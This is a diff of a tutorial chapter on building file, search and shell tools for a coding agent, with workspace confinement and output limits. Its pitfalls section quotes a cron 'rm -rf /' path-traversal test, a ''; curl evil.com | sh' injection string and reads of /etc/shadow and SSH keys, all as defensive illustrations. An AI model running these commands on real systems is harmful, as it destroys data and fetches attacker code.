@@ -1,3 +1,5 @@
+[← Phase 3: Conversation State & Streaming](./03-conversation-and-streaming.md) · [Guide index](./README.md) · [Phase 5: Permissions, Safety & the Hook System →](./05-permissions-and-safety.md)
+
 # Phase 4 — Real-World Tools (the Claude-Code Toolset)
 
 > **Series context:** Phases 0–3 built the agent loop, the tool registry with the
@@ -64,9 +66,21 @@ same job; only the organization changes:
 Between versions you will find a short *"what changed"* list, so you always know you are
 looking at a reorganization of a program you already ran — never a brand-new one.
 
+**Contents:**
+
+- [Why tools define the agent's power](#why-tools-define-the-agents-power)
+- [Version 1 — line-by-line: the agent touches your disk](#version-1--line-by-line-the-agent-touches-your-disk-no-def-no-classes)
+- [Version 2 — functions: the toolset grows, one tool at a time](#version-2--functions-the-toolset-grows-one-tool-at-a-time)
+- [Version 3 — the organized toolset](#version-3--the-organized-toolset-the-same-idea-organized)
+- [Version 3 reference — the production tools](#version-3-reference--the-production-tools)
+- [Step 3.3 — the end-to-end demo](#step-33--the-end-to-end-demo)
+- [Deep dive — output-size discipline](#deep-dive--output-size-discipline)
+- [Version 3 reference — the complete `coding_tools.py`](#version-3-reference--the-complete-coding_toolspy)
+- [Pitfalls](#pitfalls)
+
 ---
 
-## 1. Why Tools Define the Agent's Power
+## Why tools define the agent's power
 
 The loop from Phase 1 is the skeleton. Tools are the muscles. A model that can only
 reason about code it has seen in its context window is helpless against a real codebase.
@@ -75,7 +89,7 @@ make precise surgical changes. Give it `bash` and it can run tests, install pack
 and observe the results. The combination is what makes Claude Code — and what we are
 building here — feel like a capable pair-programmer rather than a sophisticated autocomplete.
 
-### 1.1 Design Principles for Agent Tools
+### Design principles for agent tools
 
 These principles apply to every tool in this phase and to any tool you will write in the
 future. They are not suggestions; violating them reliably produces broken agents.
@@ -224,7 +238,7 @@ while True:
 
 ### ▶ Run it now
 
-```
+```bash
 export OPENAI_API_KEY=sk-...
 python v1_inline_read.py
 ```
@@ -232,21 +246,24 @@ python v1_inline_read.py
 You should see the model call `read_file({'path': 'hello.txt'})`, your inline
 `open()` execute, and the answer come back describing the file's two lines.
 
-**Let it sink in.** That `open(args["path"], ...)` call ran with a path that *the model
-chose*, on *your* machine. Nothing in this program stops it from choosing
-`"../../etc/passwd"` or `"~/.ssh/id_rsa"` — try changing the task string to
-`"What is in the file /etc/hostname?"` and watch it happily read outside your project.
-That is exactly the visceral lesson Version 1 exists to teach: **a real tool is real
-power, and right now there is zero safety machinery.** Versions 2 and 3 are largely
-about earning back control: workspace confinement, output caps, and (in Phase 5) human
-approval for the dangerous calls.
+> [!WARNING]
+> **Let it sink in.** That `open(args["path"], ...)` call ran with a path that *the model
+> chose*, on *your* machine. Nothing in this program stops it from choosing
+> `"../../etc/passwd"` or `"~/.ssh/id_rsa"` — try changing the task string to
+> `"What is in the file /etc/hostname?"` and watch it happily read outside your project.
+> That is exactly the visceral lesson Version 1 exists to teach: **a real tool is real
+> power, and right now there is zero safety machinery.** Versions 2 and 3 are largely
+> about earning back control: workspace confinement, output caps, and (in Phase 5) human
+> approval for the dangerous calls.
 
 One tool, one schema dict, an inline `try`/`except` — that is the whole circuit. The
 rest of this phase is the same circuit, scaled up and reorganized.
 
 ---
 
-### What changed from Version 1 → Version 2
+## Version 2 — functions: the toolset grows, one tool at a time
+
+### What changed from V1 to V2
 
 - The inline `try`/`except open(...)` block moves out of the dispatch branch into a
   named function, `read_file(path)` — the loop just calls `read_file(**args)`.
@@ -259,10 +276,6 @@ rest of this phase is the same circuit, scaled up and reorganized.
   `_truncate` (output caps) — and every tool routes through them.
 - The harness loop itself is **unchanged**: same transcript list, same
   `call_id`/`function_call_output` handshake, same exit condition.
-
----
-
-## Version 2 — functions: the toolset grows, one tool at a time
 
 The same harness, reorganized: each tool becomes a plain function, and a dispatch dict
 maps tool names to functions. No classes, no decorators — everything here is `def`,
@@ -380,14 +393,14 @@ if __name__ == "__main__":
 
 ### ▶ Run it now
 
-```
+```bash
 export OPENAI_API_KEY=sk-...
 python v2_read_file.py
 ```
 
 You should see something like:
 
-```
+```text
 [tool] read_file({'path': 'hello.txt'})
 [result] Hello from Phase 4!
 This is line 2.
@@ -733,7 +746,7 @@ def read_file(path: str) -> str:
     return _truncate(text, label=f"read_file({path})")   # NEW: cap the output
 ```
 
-### ▶ Quick smoke test
+### ▶ Check it now (no API key needed)
 
 ```python
 # Should succeed
@@ -1270,7 +1283,7 @@ dict, add one `TOOL_FNS` entry. Nothing else moves.
 
 ### ▶ Run it now
 
-```
+```bash
 python harness_v2.py
 ```
 
@@ -1285,7 +1298,9 @@ guard. Either way, nothing outside the workspace is read.)
 
 ---
 
-### What changed from Version 2 → Version 3
+## Version 3 — the organized toolset: the same idea, organized
+
+### What changed from V2 to V3
 
 - The tool functions and helpers move out of the harness script into **one module**
   (`coding_tools.py`) with the workspace root defined once at the top.
@@ -1303,10 +1318,6 @@ guard. Either way, nothing outside the workspace is read.)
 - The harness loop **still does not change** — it consumes `registry.to_openai_schema()`
   and `registry.dispatch()`, and the `call_id` handshake is identical.
 
----
-
-## Version 3 — the organized toolset: the same idea, organized
-
 **Why now?** You have all seven tools working individually as plain functions. Version 3
 assembles them the way the consolidated package does: one module, central confinement,
 and the Phase 2 `@tool` / `ToolRegistry` machinery doing the bookkeeping — so the rest of
@@ -1316,7 +1327,7 @@ This is just the Phase 2 `ToolRegistry` pattern applied to the full toolset. If 
 skipped Phase 2, think of the registry as a dict from tool name → function, plus a method
 that produces the `tools=[...]` list for the API call.
 
-### Step 3.0 — A two-minute bridge: wiring Version 3 against your real Phase 2 code
+## Step 3.0 — A two-minute bridge: wiring Version 3 against your real Phase 2 code
 
 > **Why now?** Everything from here to the end of the phase imports the tool system you
 > built in Phase 2. Three wiring facts keep that painless — get them straight once and
@@ -1350,21 +1361,24 @@ that produces the `tools=[...]` list for the API call.
 That is the whole bridge — no code to change in Phase 2, just the right names. Your
 project folder for the rest of this phase looks like:
 
-```
+```text
 project/
 ├── tools/              # Phase 2, unchanged (base.py, registry.py, parallel.py, __init__.py)
-├── coding_tools.py     # this phase's toolset (complete listing in Section 9)
-└── demo_phase4.py      # the Version 3 harness (Section 6)
+├── coding_tools.py     # this phase's toolset (complete listing at the end of this phase)
+└── demo_phase4.py      # the Version 3 harness (Step 3.3)
 ```
 
-### Step 3.1 — Upgrade tools to use `@tool` and `ToolRegistry`
+## Step 3.1 — Upgrade tools to use `@tool` and `ToolRegistry`
 
-In the full `coding_tools.py` module (Section 9 below), every tool function carries the
+In the full `coding_tools.py` module (the
+[end-of-phase reference listing](#version-3-reference--the-complete-coding_toolspy)),
+every tool function carries the
 `@tool` decorator from Phase 2. The decorator reads the function's type hints and
 docstring and automatically writes the schema dict — so you do not have to maintain
 `READ_FILE_SCHEMA` by hand any more.
 
-> ⚠️ **What the model actually sees of your docstrings.** Phase 2's
+> [!WARNING]
+> **What the model actually sees of your docstrings.** Phase 2's
 > `_parse_google_docstring` keeps only the **first line** of each `Args:` entry — the
 > indented continuation lines under a parameter never make it into the schema. So in
 > the lovingly multi-line docstrings below, only each parameter's first line reaches
@@ -1373,7 +1387,7 @@ docstring and automatically writes the schema dict — so you do not have to mai
 > the model receives, print it — e.g. `from coding_tools import grep` then
 > `print(grep.parameters)` — and you will see exactly where each description is cut.
 
-### Step 3.2 — `make_default_registry`
+## Step 3.2 — `make_default_registry`
 
 ```python
 def make_default_registry(workspace: pathlib.Path = None) -> ToolRegistry:
@@ -1417,11 +1431,13 @@ the function was defined, so there is nothing more to do.
 
 ---
 
-## 2. Module Layout and Shared Utilities
+## Version 3 reference — module layout and shared utilities
 
-*This section describes the production-ready `coding_tools.py` layout — the rest of
-Version 3. You have already met all the pieces above; here they are explained in their
-final assembled form.*
+> **Reference section.** From here to the end-to-end demo, nothing new runs — these
+> sections describe the production-ready `coding_tools.py` layout, the rest of
+> Version 3. You have already met all the pieces above; here they are explained in
+> their final assembled form. Skim for the named differences, or skip ahead to
+> [Step 3.3 — the end-to-end demo](#step-33--the-end-to-end-demo).
 
 All tools live in a single module `coding_tools.py` (recall from Step 3.0 why the name
 is not `tools.py`: that would be shadowed by Phase 2's `tools/` package directory). At
@@ -1474,7 +1490,7 @@ def set_workspace(path: pathlib.Path) -> None:
     WORKSPACE_ROOT = pathlib.Path(path).resolve()
 ```
 
-`make_default_registry(workspace=...)` (Section 4) calls the same idea inline. One
+`make_default_registry(workspace=...)` (Step 3.2) calls the same idea inline. One
 subtlety worth stealing from the package: its `_safe_path` rejects escapes with
 `Path.is_relative_to()`, **not** a string `startswith` check — a plain prefix
 comparison would let a sibling directory like `/ws-evil` slip through for workspace
@@ -1483,13 +1499,17 @@ pre-3.9-friendly spelling of the same test.
 
 ---
 
-## 3. The Tools (production versions)
+## Version 3 reference — the production tools
 
-*These are the same functions you built in Steps 2.0–2.6, now using `@tool`, `_safe_path`,
-and `_truncate`. The logic is identical; only the decorators and shared helpers have been
-added.*
+> **Reference copy.** These are the same seven functions you built in Steps 2.0–2.6,
+> now using `@tool`, `_safe_path`, and `_truncate`. The logic is identical; only the
+> decorators, shared helpers, and some production polish (line-numbered paging in
+> `read_file`, result caps, binary-file detection) have been added. Nothing new to type
+> here — skim or skip. The maintained versions live in
+> [code/agent_harness/tools/files.py](./code/agent_harness/tools/files.py) and
+> [shell.py](./code/agent_harness/tools/shell.py).
 
-### 3.1 `read_file`
+### `read_file` (production form)
 
 ```python
 @tool
@@ -1575,7 +1595,7 @@ but idiomatic agent usage is to request a small window first and page forward as
 
 ---
 
-### 3.2 `write_file`
+### `write_file` (production form)
 
 ```python
 @tool
@@ -1617,7 +1637,7 @@ def write_file(path: str, content: str) -> str:
 
 ---
 
-### 3.3 `edit_file` — the Surgical Edit Tool
+### `edit_file` (production form) — the surgical edit tool
 
 ```python
 @tool
@@ -1707,7 +1727,7 @@ def edit_file(
 
 ---
 
-### 3.4 `bash` — Shell Command Execution
+### `bash` (production form) — shell command execution
 
 ```python
 @tool
@@ -1770,7 +1790,7 @@ def bash(command: str, timeout: int = 120) -> str:
 
 ---
 
-### 3.5 `glob`
+### `glob` (production form)
 
 ```python
 @tool
@@ -1846,7 +1866,7 @@ permission needed. Reserve `bash` for operations that genuinely require the shel
 
 ---
 
-### 3.6 `grep`
+### `grep` (production form)
 
 ```python
 @tool
@@ -1983,7 +2003,7 @@ The tradeoff is that it does not support the full `grep` flag set (e.g., `-l`, `
 
 ---
 
-### 3.7 `list_dir`
+### `list_dir` (production form)
 
 ```python
 @tool
@@ -2058,7 +2078,10 @@ def _human_size(n: int) -> str:
 
 ---
 
-## 4. Registering Everything: `make_default_registry`
+## Version 3 reference — registering everything: `make_default_registry`
+
+> **Reference copy.** This is Step 3.2's `make_default_registry`, unchanged — shown
+> again in its place at the bottom of the assembled module.
 
 ```python
 def make_default_registry(workspace: pathlib.Path = None) -> ToolRegistry:
@@ -2091,9 +2114,32 @@ list and dispatch by name. All we do here is register every `@tool`-decorated fu
 The `@tool` decorator extracted the JSON schema from type hints and the docstring when
 the function was defined, so there is nothing more to do.
 
+### ▶ Check it now (no API key needed)
+
+You have now seen every piece of Version 3. Paste the assembled module from the
+[end-of-phase reference listing](#version-3-reference--the-complete-coding_toolspy)
+into `coding_tools.py` (next to Phase 2's `tools/` package, per the Step 3.0 layout),
+then run the six-line offline smoke test that accompanies that listing:
+
+```bash
+python smoke_test_tools.py
+```
+
+You should see:
+
+```text
+7
+Directory: .  (1 dirs, 2 files) ...
+ERROR: File not found: nope.txt
+```
+
+The script itself and a walkthrough of the expected output sit right under the
+reference listing — no API key, no model call, just proof that the registry and all
+seven tools are wired.
+
 ---
 
-## 5. Toolset Reference Table
+## Toolset reference table
 
 | Tool | Signature | Purpose | Risk level |
 |------|-----------|---------|------------|
@@ -2107,7 +2153,7 @@ the function was defined, so there is nothing more to do.
 
 ---
 
-## 6. End-to-End Demo
+## Step 3.3 — the end-to-end demo
 
 The following demo is **Version 3 running end-to-end**: it wires the tool registry into
 the agent loop you built in Phase 3 (the plain, non-streaming form — swapping in
@@ -2115,7 +2161,7 @@ Phase 3's streaming variant is a good exercise, but it would only change how the
 arrives, not what the agent does) and sends the agent a real task — find all TODO
 comments in a small project and summarize them.
 
-### 6.1 Setup
+### Demo setup
 
 ```python
 # demo_phase4.py
@@ -2124,7 +2170,7 @@ End-to-end demo: an agent finds and summarizes TODO comments in a project.
 
 Prerequisites (see the Step 3.0 bridge for the folder layout):
   - Phase 2's tools/ package in the same folder
-  - coding_tools.py next to it (the complete Version 3 module from Section 9)
+  - coding_tools.py next to it (the complete end-of-phase reference module)
   - pip install openai
   - export OPENAI_API_KEY=sk-...
 """
@@ -2135,7 +2181,7 @@ import textwrap
 import json
 
 from openai import OpenAI
-from coding_tools import make_default_registry   # Section 9's module (pulls in Phase 2)
+from coding_tools import make_default_registry   # the reference module (pulls in Phase 2)
 
 # ── Create a toy project for the agent to explore ────────────────────────────
 
@@ -2172,7 +2218,7 @@ def create_sample_project(root: pathlib.Path) -> None:
     (root / "README.md").write_text("# Sample Project\n")
 ```
 
-### 6.2 The Agent Loop
+### The demo agent loop
 
 ```python
 def run_demo():
@@ -2271,18 +2317,19 @@ if __name__ == "__main__":
 
 This is Version 3's full checkpoint. It needs exactly three things side by side (the
 Step 3.0 layout): Phase 2's `tools/` package, `coding_tools.py` (the complete module in
-Section 9 — paste it now if you haven't yet), and this `demo_phase4.py`.
+the [end-of-phase reference listing](#version-3-reference--the-complete-coding_toolspy)
+— paste it now if you haven't yet), and this `demo_phase4.py`.
 
-```
+```bash
 export OPENAI_API_KEY=sk-...
 python demo_phase4.py
 ```
 
-You should see a transcript like the one in 6.3 below. (Want to check the wiring
-*before* spending an API call? The offline smoke test at the end of Section 9 exercises
-the registry and tools with no key at all.)
+You should see a transcript like the one below. (Want to check the wiring
+*before* spending an API call? The offline smoke test under the reference listing
+exercises the registry and tools with no key at all.)
 
-### 6.3 Transcript (representative output)
+### Transcript (representative output)
 
 The exact sequence varies by model run, but a typical execution looks like this:
 
@@ -2327,12 +2374,12 @@ efficient search strategy.
 
 ---
 
-## 7. Output-Size Discipline (Deep Dive)
+## Deep dive — output-size discipline
 
 The `_truncate` helper appears in every tool that reads file contents or command output.
 This section explains why it is non-negotiable.
 
-### 7.1 The Context-Window Economy
+### The context-window economy
 
 Every token in the context window is a shared resource competed for by:
 
@@ -2347,7 +2394,7 @@ line file consumes ~50,000 tokens — the entire context window of GPT-3.5, most
 GPT-4's. The model then either truncates its own reasoning to fit, or the API silently
 drops early history items, causing the model to forget it had a plan.
 
-### 7.2 The Truncation Contract
+### The truncation contract
 
 `_truncate` enforces two limits:
 - **`max_chars = 40,000`** — roughly 10,000 tokens at 4 chars/token. Generous enough
@@ -2357,7 +2404,7 @@ drops early history items, causing the model to forget it had a plan.
 
 Both limits emit a visible notice so the model knows output was cut:
 
-```
+```text
 [... output truncated at 2000 lines ...]
 ```
 
@@ -2365,7 +2412,7 @@ This is the correct behaviour. Silently truncating without a notice would cause 
 to believe it has the full output when it does not, producing hallucinated reasoning. The
 notice tells it to ask for more if it needs it.
 
-### 7.3 Foreshadowing Phase 6
+### Foreshadowing Phase 6
 
 Phase 6 covers context compaction: strategies for summarizing old tool results before
 they crowd out current reasoning, sliding-window approaches, and the `max_output_tokens`
@@ -2374,89 +2421,17 @@ second line. Both are necessary.
 
 ---
 
-## 8. Pitfalls and How to Avoid Them
+## Version 3 reference — the complete `coding_tools.py`
 
-> This section documents the most common failure modes when building agent tools. Each
-> one has burned at least one production system.
-
-### Path Traversal
-
-**Symptom:** The model passes `path="../../../etc/passwd"` or an absolute path like
-`/etc/shadow`. Without a guard, `write_file` happily overwrites it.
-
-**Fix:** `_safe_path()` — every path tool call goes through it. The guard uses
-`Path.resolve()` to follow symlinks and then checks that the result is relative to
-`WORKSPACE_ROOT`. There is no edge case in which a relative path with `..` or a symlink
-chain can escape.
-
-**Test it:**
-
-```python
-# This should return an ERROR string, not write anything.
-result = write_file("../../etc/cron.d/evil", "* * * * * rm -rf /")
-assert result.startswith("ERROR:")
-```
-
-### Reading Huge Files
-
-**Symptom:** The model calls `read_file("node_modules/big_lib/dist/bundle.js")` and
-gets 80,000 lines of minified JavaScript, consuming the entire context window.
-
-**Fix:** The `limit=2000` default and `_truncate` backstop. For intentionally large
-files, `offset`/`limit` pagination is the right pattern. Teach the model (in the system
-prompt or tool description) to read in windows rather than pulling entire files.
-
-### Edit Ambiguity
-
-**Symptom:** The model calls `edit_file` with `old_string="pass"` thinking there is one
-such line. The file has 40 functions with `pass` as a body. The tool returns an ambiguity
-error.
-
-**Fix:** The uniqueness check in `edit_file`. The model must provide enough surrounding
-context (e.g., the full function signature plus the body) to make `old_string` unique.
-The error message says "found N occurrences" so the model knows exactly why it failed
-and what to do.
-
-### Command Injection
-
-**Symptom:** User input is interpolated into a `bash` command:
-`bash(f"grep {user_query} src/")`. User types `'; curl evil.com | sh; #'`.
-
-**Fix:** Never interpolate unsanitised user input into shell commands. In a coding
-agent, the model constructs commands — not the end user directly. The Phase 5 permission
-layer adds a human-approval step for `bash` calls. If you need to pass user data to a
-command, use `subprocess.run([...], shell=False)` with a properly escaped argument list,
-or sanitise the input yourself.
-
-### Blocking on Interactive Commands
-
-**Symptom:** The model calls `bash("python3 -i")` trying to start a REPL. The process
-waits for stdin forever. The timeout fires after 120 seconds.
-
-**Fix:** `stdin=subprocess.DEVNULL` ensures the process sees EOF immediately if it
-tries to read. The docstring warns the model explicitly: "Interactive commands will
-hang. Use non-interactive invocations." Also, 120 seconds is generous — for quick
-operations lower the timeout to 30 seconds.
-
-### Encoding Errors
-
-**Symptom:** A source file contains a Latin-1 byte sequence (e.g., a comment with an
-accented character in an old codebase). `p.read_text(encoding="utf-8")` raises
-`UnicodeDecodeError`. The tool crashes — or would, if we did not handle it.
-
-**Fix:** Every read in this module uses `errors='replace'`. This substitutes the
-Unicode replacement character (U+FFFD) for undecodable bytes. The model sees the file
-with `?`-like markers instead of a hard error. For truly binary files the null-byte
-heuristic fires first. This is the correct approach: never crash on encoding issues in
-a tool; always return something the model can reason about.
-
----
-
-## 9. Complete `coding_tools.py` (Version 3, complete)
+> **Reference copy.** Assembled unchanged, in dependency order, from the production
+> forms above (which are themselves Steps 2.0–2.6 plus the `@tool` upgrade). Nothing
+> new to type here beyond pasting it whole — skim or skip. The maintained version lives
+> in [code/agent_harness/tools/files.py](./code/agent_harness/tools/files.py) and
+> [shell.py](./code/agent_harness/tools/shell.py).
 
 For reference, here is the full Version 3 module with all pieces assembled in dependency
 order. Together with the `tools/` package you built in Phase 2 and the `demo_phase4.py`
-harness from Section 6, this is the complete runnable Version 3 program (see the
+harness from Step 3.3, this is the complete runnable Version 3 program (see the
 Step 3.0 bridge for the three-file folder layout):
 
 ```python
@@ -2870,7 +2845,7 @@ def make_default_registry(workspace: pathlib.Path = None) -> ToolRegistry:
     return registry
 ```
 
-### ▶ Run it now (no API key needed)
+### ▶ Check it now (no API key needed)
 
 Before wiring the model in, prove the module and the Phase 2 registry are talking to
 each other. With `coding_tools.py` saved next to your Phase 2 `tools/` package, save and
@@ -2886,24 +2861,25 @@ print(registry.dispatch("list_dir", '{"path": "."}')[:200])       # your folder 
 print(registry.dispatch("read_file", '{"path": "nope.txt"}'))     # ERROR: File not found...
 ```
 
-```
+```bash
 python smoke_test_tools.py
 ```
 
 Note the second argument to `dispatch` is a **JSON string**, exactly what the model
 sends as `tc.arguments`. If you see the count `7`, a directory listing, and a clean
 `ERROR:` string (not a traceback), Version 3 is fully wired — `demo_phase4.py` in
-Section 6 is the same plumbing plus the model.
+Step 3.3 is the same plumbing plus the model.
 
 (Experiment further and you will notice two error spellings living side by side:
-this module's tools return `"ERROR: ..."` — the Section 1.1(d) contract — while
+this module's tools return `"ERROR: ..."` — design principle (d) from the start of
+this phase — while
 Phase 2's registry says `"Error: ..."` for *its* failures: unknown tool, bad JSON,
 an exception escaping a tool. The model reads either just fine; Phase 5 acknowledges
 and reconciles the mismatch.)
 
 ---
 
-## 10. What Comes Next
+## What comes next
 
 This phase gave the agent hands: it can now read any file in its workspace, make
 surgical edits, run shell commands, and search the codebase efficiently. But with great
@@ -2921,10 +2897,83 @@ fills the context window: how to summarize stale tool results, implement a slidi
 window over the transcript, and use `max_output_tokens` budgeting to keep the model
 reasoning clearly across hundreds of tool calls.
 
-**Practice first:** before moving on, try the
-[Phase 4 exercises](./EXERCISES.md#phase-4--real-tools) — they extend the toolset you
-just built (and you can start from your `harness_v2.py` or the Version 3 module,
-whichever feels more comfortable).
+---
+
+## Pitfalls
+
+> This section documents the most common failure modes when building agent tools. Each
+> one has burned at least one production system.
+
+### Path Traversal
+
+**Symptom:** The model passes `path="../../../etc/passwd"` or an absolute path like
+`/etc/shadow`. Without a guard, `write_file` happily overwrites it.
+
+**Fix:** `_safe_path()` — every path tool call goes through it. The guard uses
+`Path.resolve()` to follow symlinks and then checks that the result is relative to
+`WORKSPACE_ROOT`. There is no edge case in which a relative path with `..` or a symlink
+chain can escape.
+
+**Test it:**
+
+```python
+# This should return an ERROR string, not write anything.
+result = write_file("../../etc/cron.d/evil", "* * * * * rm -rf /")
+assert result.startswith("ERROR:")
+```
+
+### Reading Huge Files
+
+**Symptom:** The model calls `read_file("node_modules/big_lib/dist/bundle.js")` and
+gets 80,000 lines of minified JavaScript, consuming the entire context window.
+
+**Fix:** The `limit=2000` default and `_truncate` backstop. For intentionally large
+files, `offset`/`limit` pagination is the right pattern. Teach the model (in the system
+prompt or tool description) to read in windows rather than pulling entire files.
+
+### Edit Ambiguity
+
+**Symptom:** The model calls `edit_file` with `old_string="pass"` thinking there is one
+such line. The file has 40 functions with `pass` as a body. The tool returns an ambiguity
+error.
+
+**Fix:** The uniqueness check in `edit_file`. The model must provide enough surrounding
+context (e.g., the full function signature plus the body) to make `old_string` unique.
+The error message says "found N occurrences" so the model knows exactly why it failed
+and what to do.
+
+### Command Injection
+
+**Symptom:** User input is interpolated into a `bash` command:
+`bash(f"grep {user_query} src/")`. User types `'; curl evil.com | sh; #'`.
+
+**Fix:** Never interpolate unsanitised user input into shell commands. In a coding
+agent, the model constructs commands — not the end user directly. The Phase 5 permission
+layer adds a human-approval step for `bash` calls. If you need to pass user data to a
+command, use `subprocess.run([...], shell=False)` with a properly escaped argument list,
+or sanitise the input yourself.
+
+### Blocking on Interactive Commands
+
+**Symptom:** The model calls `bash("python3 -i")` trying to start a REPL. The process
+waits for stdin forever. The timeout fires after 120 seconds.
+
+**Fix:** `stdin=subprocess.DEVNULL` ensures the process sees EOF immediately if it
+tries to read. The docstring warns the model explicitly: "Interactive commands will
+hang. Use non-interactive invocations." Also, 120 seconds is generous — for quick
+operations lower the timeout to 30 seconds.
+
+### Encoding Errors
+
+**Symptom:** A source file contains a Latin-1 byte sequence (e.g., a comment with an
+accented character in an old codebase). `p.read_text(encoding="utf-8")` raises
+`UnicodeDecodeError`. The tool crashes — or would, if we did not handle it.
+
+**Fix:** Every read in this module uses `errors='replace'`. This substitutes the
+Unicode replacement character (U+FFFD) for undecodable bytes. The model sees the file
+with `?`-like markers instead of a hard error. For truly binary files the null-byte
+heuristic fires first. This is the correct approach: never crash on encoding issues in
+a tool; always return something the model can reason about.
 
 ---
 
@@ -2956,6 +3005,11 @@ whichever feels more comfortable).
    workspace root — so the model can see the problem and the harness stays safe.
 4. In **`make_default_registry()`**.
 </details>
+
+**Practice first:** before moving on, try the
+[Phase 4 exercises](./EXERCISES.md#phase-4--real-tools) — they extend the toolset you
+just built (and you can start from your `harness_v2.py` or the Version 3 module,
+whichever feels more comfortable).
 
 **Next:** [Phase 5 — Permissions, Safety & the Hook System](./05-permissions-and-safety.md)
 — the layer that decides which of these tool calls is actually allowed to run.
